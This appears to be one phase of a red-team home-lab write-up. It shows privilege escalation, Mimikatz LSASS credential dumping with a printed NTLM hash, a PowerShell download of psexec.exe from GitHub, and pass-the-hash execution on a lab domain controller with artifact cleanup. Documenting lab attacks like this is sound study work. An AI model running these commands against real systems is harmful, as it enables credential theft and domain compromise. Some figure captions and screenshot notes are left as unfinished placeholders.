Phase 6: Privilege Escalation & Lateral Movement
________________________________________
Overview
Objective
Demonstrate the complete attack lifecycle of elevating privileges from a standard domain user to achieving Tier-0 Domain Controller compromise. This phase details how a localized foothold as a normal user (FADHLI-WIN10) is escalated to NT AUTHORITY\SYSTEM via service manipulation. These elevated privileges are immediately used to harvest cached administrative credentials (FADH-WIN10), which are then weaponized to laterally pivot to the Active Directory Domain Controller (REDGUNN.local).
MITRE ATT&CK Mapping
•	Tactic: TA0004 – Privilege Escalation, TA0006 – Credential Access, TA0008 – Lateral Movement
•	T1543.003: Create or Modify System Process: Windows Service
•	T1003.001: OS Credential Dumping: LSASS Memory
•	T1105: Ingress Tool Transfer (Proxy Evasion)
•	T1550.002: Use Alternate Authentication Material: Pass the Hash
•	T1021.002: Remote Services: SMB/Windows Admin Shares
________________________________________
Strategy & Attack Flow
The attack sequence follows a highly deliberate, four-stage flow to bypass network constraints and exploit credential remnants:
1.	Privilege Escalation (Service Hijacking): Operating as a standard user (FADHLI-WIN10), the attacker installs and executes a malicious service payload to elevate the session to NT AUTHORITY\SYSTEM.
 (Note: Service manipulation executed in previous phase #).
2.	Credential Harvesting: Leveraging the newly acquired SYSTEM privileges (specifically SeDebugPrivilege), the attacker injects into LSASS memory to steal the cached NTLM hash of a Domain/Workstation Administrator (FADH-WIN10) who previously authenticated to the machine.
3.	Tactical Tool Ingress (Proxy Evasion): To bypass the instability of routing heavy SMB/RPC traffic through a C2 SOCKS proxy, the attacker uploads a pre-compiled Windows executable (psexec.exe) directly to the compromised Workstation.
4.	Internal Pivoting & Execution: The compromised Workstation is weaponized as a launchpad. The attacker uses the stolen FADH-WIN10 hash to authenticate natively over the internal network to the Domain Controller, executing a hit-and-run command via Service Control Manager (SCM) abuse before cleaning up forensic artifacts.
________________________________________
🔴 Attack Timeline & Execution
Step 2: Credential Harvesting via LSASS Dump
Context: Now operating as SYSTEM, the attacker possesses the necessary rights to read the memory space of the Local Security Authority Subsystem Service (lsass.exe). The target is the cached NTLM hash of FADH-WIN10, an administrative account that possesses both Local Admin rights on the workstation and Administrative rights within the REDGUNN.local domain.
Execution (Sliver / PowerShell):
PowerShell
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
📌 Screenshot Note: Insert Mimikatz output showing Account FADH-WIN10 and NTLM Hash 5605a652e5f078353f8ecf73e3771b75.

<p align="center">
  <img src="images/mimikatz2.png">
</p>
<p align="center">
<p align="center">
  <img src="images/mimikatz1.png">
</p>
<p align="center">

<em>Figure 6.1: Mimikatz dumping the NTLM hash of the FADH-WIN10 administrative account from LSASS.
</p>

Username: FADH-WIN10 | Domain: REDGUNN | NTLM: 5605a652e5f078353f8ecf73e3771b75</em> </p>
Step 3: Tactical Tool Ingress (Living off the Land)
Context: Initial attempts to execute Impacket scripts directly from the attacker's machine through the Sliver SOCKS proxy failed due to SMB/RPC protocol latency, resulting in 0-byte payload transfers. To adapt, the attacker shifts tactics by bringing the lateral movement tool directly into the target network. Instead of pushing the file through the C2 tunnel, the attacker leverages the workstation's native command-line utilities to "pull" the binary from an external source.
Execution (PowerShell on Workstation): The attacker uses PowerShell's built-in wget alias (Invoke-WebRequest) to download a compiled Windows binary of Impacket's PsExec (psexec.exe) directly into a low-profile public directory.
PowerShell
PS C:\Users\Public> Invoke-WebRequest https://raw.githubusercontent.com/maaaaz/impacket-examples-windows/master/psexec.exe -UseBasicParsing -OutFile psexec.exe 
<p align="center">
  <img src="images/wget.png">
</p>
<p align="center">

<em>Figure 6.1: …..
</p>
<p align="center">
  <img src="images/wget2.png">
</p>
<p align="center">

<em>Figure 6.1:from pov of the desktop the psexec is downlaoded.
</p>

Step 4: Lateral Pivot via Pass-the-Hash (PtH)
Context: The attacker executes psexec.exe using the harvested FADH-WIN10 NTLM hash. This bypasses plaintext password requirements and successfully authenticates to the REDGUNN.local DC via SMB (Port 445).
Execution (PowerShell on Workstation):
PowerShell
PS C:\Users\Public> .\psexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:5605a652e5f078353f8ecf73e3771b75 REDGUNN/FADH-WIN10@192.168.3.11
<p align="center">
  <img src="images/ad.png">
</p>
<p align="center">
<em>Figure 6.2: Local execution of psexec authenticating to the Domain Controller via Pass-the-Hash</em> </p>
Step 5: Remote Execution & Automated Artifact Cleanup
Context: To avoid interactive shell timeouts associated with nested C2 pipes ("Shell Inception"), the attacker opts for a single-command execution ("hit-and-run"). psexec.exe drops a randomized payload into the DC's ADMIN$ share, abuses the Service Control Manager to start the malicious service, executes the ipconfig command, returns the SYSTEM-level output to the attacker, and then aggressively deletes the temporary service and binary to cover its tracks.
Execution:
PowerShell
PS C:\Users\Public> .\psexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:5605a652e5f078353f8ecf73e3771b75 REDGUNN/FADH-WIN10@192.168.3.11 "ipconfig" 
📌 Screenshot Note: Insert screenshot showing the execution yielding "REDGUNN-DC" network info and the subsequent Cleanup Phase (Removing service... Removing file...)
<p align="center">
  <img src="images/ad3.png">
</p>

<p align="center">
  <img src="images/ad2.png">
</p>
<em>Figure 6.3: Successful remote execution confirming Tier-0 access, followed by immediate artifact removal</em> </p>

